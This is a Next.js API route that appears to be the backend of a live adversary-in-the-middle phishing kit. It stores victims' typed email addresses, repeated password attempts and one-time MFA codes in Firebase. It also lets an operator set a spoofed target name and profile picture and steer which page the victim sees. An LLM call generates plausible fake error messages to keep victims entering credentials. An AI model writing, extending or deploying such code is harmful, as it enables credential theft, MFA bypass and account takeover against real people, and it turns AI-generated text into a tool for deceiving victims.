import { NextRequest, NextResponse } from 'next/server';
import { get, ref, set, update, push as firebasePush } from 'firebase/database';
import { db } from '@/lib/firebase';
import { initialState } from '@/lib/state';
import { simulateErrorWithLLM } from '@/ai/flows/simulate-error';

export const dynamic = 'force-dynamic';

async function getAppState() {
  const stateRef = ref(db, '/');
  const snapshot = await get(stateRef);
  if (snapshot.exists()) {
    const val = snapshot.val();
    // Ensure all keys from initialState are present
    return {
      config: { ...initialState.config, ...(val.config || {}) },
      victim: { ...initialState.victim, ...(val.victim || {}) }
    };
  }
  return initialState;
}

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const view = searchParams.get('view');
  const appState = await getAppState();

  if (view === 'admin') {
    return NextResponse.json(appState);
  }

  if (view === 'victim') {
    return NextResponse.json({
      currentPage: appState.victim.currentPage,
      email: appState.victim.email,
      name: appState.victim.name,
      profilePicture: appState.victim.profilePicture,
      errorMessage: appState.victim.errorMessage,
      redirectUrl: appState.config.redirectUrl,
    });
  }

  return NextResponse.json({ error: 'Invalid view' }, { status: 400 });
}

export async function POST(request: NextRequest) {
  const body = await request.json();
  const stateRef = ref(db, '/');

  switch (body.action) {
    case 'setConfig':
      await set(ref(db, 'config'), body.config);
      // Reset victim state when new config is set
      await set(ref(db, 'victim'), initialState.victim);
      return NextResponse.json({ success: true, message: 'Configuration updated' });

    case 'setVictimPage':
      await update(ref(db, 'victim'), { currentPage: body.page });
      return NextResponse.json({ success: true, message: `Victim page set to ${body.page}` });

    case 'submitEmail': {
      const configRef = ref(db, 'config');
      const configSnapshot = await get(configRef);
      const config = configSnapshot.exists() ? configSnapshot.val() : initialState.config;
      
      const victimUpdate: any = {
        email: body.email,
        currentPage: 'password',
      };

      if (body.email.toLowerCase() === config.targetEmail.toLowerCase()) {
        victimUpdate.name = config.targetName;
        victimUpdate.profilePicture = config.targetProfilePicture;
      } else {
        // For non-target emails, we can set a default name or leave it blank
        victimUpdate.name = 'Account'; // Or derive from email, e.g., body.email.split('@')[0]
        victimUpdate.profilePicture = ''; // Default or empty profile picture
      }
      await update(ref(db, 'victim'), victimUpdate);
      return NextResponse.json({ success: true });
    }

    case 'submitPassword': {
      const victimRef = ref(db, 'victim');
      const victimSnapshot = await get(victimRef);
      const victim = victimSnapshot.exists() ? victimSnapshot.val() : initialState.victim;

      const newAttempts = (victim.attempts || 0) + 1;
      const passwordsRef = ref(db, 'victim/passwords');
      await firebasePush(passwordsRef, body.password);

      let victimUpdate: any = { attempts: newAttempts };

      if (victim.currentPage === 'password') {
          victimUpdate.currentPage = 'pwCatch';
      } else if (victim.currentPage === 'pwCatch') {
        if (newAttempts >= 2) {
          try {
            const { errorMessage } = await simulateErrorWithLLM({ attempts: newAttempts });
            victimUpdate.errorMessage = errorMessage;
            victimUpdate.currentPage = 'error';
          } catch (error) {
            console.error("AI simulation failed:", error);
            victimUpdate.errorMessage = "An unexpected error occurred. Please try again later.";
            victimUpdate.currentPage = 'error';
          }
        }
      }
      await update(victimRef, victimUpdate);
      return NextResponse.json({ success: true });
    }
    
    case 'submitOtp':
      await update(ref(db, 'victim'), {
        otp: body.otp,
        currentPage: 'redirect'
      });
      return NextResponse.json({ success: true });

    case 'reset':
      await set(stateRef, initialState);
      return NextResponse.json({ success: true, message: 'State reset' });
      
    default:
      return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
  }
}
